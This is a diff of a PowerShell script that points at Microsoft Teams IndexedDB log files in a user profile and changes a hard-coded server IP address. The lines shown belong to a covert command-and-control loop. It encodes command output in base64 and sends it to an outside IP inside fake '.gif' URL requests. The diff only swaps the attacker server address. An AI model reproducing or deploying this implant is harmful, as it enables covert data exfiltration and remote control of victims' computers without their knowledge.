@@ -1,7 +1,7 @@
 $importPath = "C:\Users\s93754\AppData\Roaming\Microsoft\Teams\IndexedDB\https_teams.microsoft.com_0.indexeddb.leveldb\*.log"
 
 
-$originalendpoint = 'http://139.162.53.145:80/.gif'
+$originalendpoint = 'http://172.104.184.253:80/.gif'
 
 while ($true) {
 
@@ -41,7 +41,7 @@ echo $cmdOutput
 $encodedBytes = [System.Text.Encoding]::UTF8.GetBytes($cmdOutput)
 $encodedText = [System.Convert]::ToBase64String($encodedBytes)
 echo $encodedText
-$gifendpoint = "http://139.162.53.145:80/"+$encodedText+".gif"
+$gifendpoint = "http://172.104.184.253:80/"+$encodedText+".gif"
 
 $gifendpoint
 
